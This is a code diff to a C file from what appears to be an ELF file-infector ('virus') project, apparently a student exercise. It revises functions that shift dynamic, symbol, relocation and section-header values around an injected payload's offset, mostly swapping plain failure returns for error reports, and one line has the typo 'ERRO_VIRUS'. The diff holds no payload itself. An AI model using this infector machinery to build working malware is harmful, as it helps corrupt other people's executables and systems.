@@ -1,11 +1,11 @@
 #include "virus.h"
 #include "errors.h"
 
-#define DF_1_PIE		0x08000000
+#define R_X86_64_64		0x01        // direct 64 bit relocation
+#define R_X86_64_RELATIVE	0x08        // adjust by program base
+#define R_X86_64_IRELATIVE	0x25        // adjust indirectly by program base
 
-#define R_X86_64_64		0x01    // direct 64 bit relocation
-#define R_X86_64_RELATIVE	0x08    // adjust by program base
-#define R_X86_64_IRELATIVE	0x25    // adjust indirectly by program base
+#define DF_1_PIE		0x08000000  // position independent executable
 
 #define is_loadable(type)	(type == PT_LOAD)
 #define is_pie(tag)		(d_tag & DF_1_PIE)
@@ -76,7 +76,7 @@ static bool	adjust_dynamic_values(struct safe_ptr ref, size_t offset, void *data
 	Elf64_Dyn	*dynamic = safe(ref, offset, sizeof(Elf64_Dyn));
 
 	if (dynamic == NULL)
-		return false;
+		return errors(ERR_VIRUS, _ERR_V_CANT_READ_DYNAMIC);
 
 	Elf64_Sxword	d_tag = dynamic->d_tag;
 	Elf64_Addr	d_ptr = dynamic->d_un.d_ptr;
@@ -85,7 +85,6 @@ static bool	adjust_dynamic_values(struct safe_ptr ref, size_t offset, void *data
 	size_t		payload_addr = closure->payload_addr;
 	size_t		shift_amount = closure->shift_amount;
 
-	//
 	if (d_tag == DT_FLAGS_1 && is_pie(d_tag))
 		closure->is_pie = true;
 
@@ -118,7 +117,7 @@ static bool	adjust_dynsym_values(struct safe_ptr ref, size_t offset, void *data)
 	Elf64_Sym	*dynsym = safe(ref, offset, sizeof(Elf64_Sym));
 
 	if (dynsym == NULL)
-		return false;
+		return errors(ERR_VIRUS, _ERR_V_CANT_READ_DYNAMIC_SYM);
 
 	Elf64_Addr	st_value = dynsym->st_value;
 
@@ -138,7 +137,7 @@ static bool	adjust_rel_values(struct safe_ptr ref, size_t offset, void *data)
 	Elf64_Rela	*rel = safe(ref, offset, sizeof(Elf64_Rel));
 
 	if (rel == NULL)
-		return false;
+		return errors(ERRO_VIRUS, _ERR_V_CANT_READ_RELOCATION);
 
 	struct data	*closure = data;
 	size_t		payload_addr = closure->payload_addr;
@@ -158,7 +157,7 @@ static bool	adjust_rela_values(struct safe_ptr ref, size_t offset, void *data)
 	Elf64_Rela	*rela = safe(ref, offset, sizeof(Elf64_Rela));
 
 	if (rela == NULL)
-		return false;
+		return errors(ERR_VIRUS, _ERR_V_CANT_READ_RELA);
 
 	struct data	*closure = data;
 	size_t		payload_addr = closure->payload_addr;
@@ -173,7 +172,7 @@ static bool	adjust_rela_values(struct safe_ptr ref, size_t offset, void *data)
 	{
 		rela->r_offset += shift_amount;
 	}
-	if (r_addend >= payload_offset
+	if (r_addend >= (int64_t)payload_offset
 	&& (r_info == R_X86_64_64 || r_info == R_X86_64_RELATIVE || r_info == R_X86_64_IRELATIVE))
 	{
 		rela->r_addend += shift_amount;
@@ -212,24 +211,26 @@ static bool	adjust_shdr_values(struct safe_ptr ref, size_t offset, void *data)
 	if (sh_type == SHT_DYNSYM)
 	{
 		if (!foreach_shdr_entry(ref, offset, adjust_dynsym_values, closure))
-			return false;
+			goto error;
 	}
 	else if (sh_type == SHT_REL)
 	{
 		if (!foreach_shdr_entry(ref, offset, adjust_rel_values, closure))
-			return false;
+			goto error;
 	}
 	else if (sh_type == SHT_RELA)
 	{
 		if (!foreach_shdr_entry(ref, offset, adjust_rela_values, closure))
-			return false;
+			goto error;
 	}
 	else if (sh_type == SHT_DYNAMIC)
 	{
 		if (!foreach_shdr_entry(ref, offset, adjust_dynamic_values, closure))
-			return false;
+			goto error;
 	}
 	return true;
+error:
+	return errors(ERR_THROW, _ERR_T_ADJUST_SHDR_VALUES);
 }
 
 bool		adjust_references(struct safe_ptr clone_ref,
@@ -239,7 +240,7 @@ bool		adjust_references(struct safe_ptr clone_ref,
 	const size_t	payload_addr = clone_entry.payload_addr;
 
 	if (!adjust_header_values(clone_ref, payload_offset, shift_amount))
-		return false;
+		return errors(ERR_THROW, _ERR_T_ADJUST_REFERENCES);
 
 	struct data	closure;
 
@@ -254,7 +255,7 @@ bool		adjust_references(struct safe_ptr clone_ref,
 		return errors(ERR_THROW, _ERR_T_ADJUST_REFERENCES);
 
 	if (closure.is_pie == false)
-		return false;
+		return errors(ERR_VIRUS, _ERR_V_IS_NOT_PIE);
 
 	return true;
 }
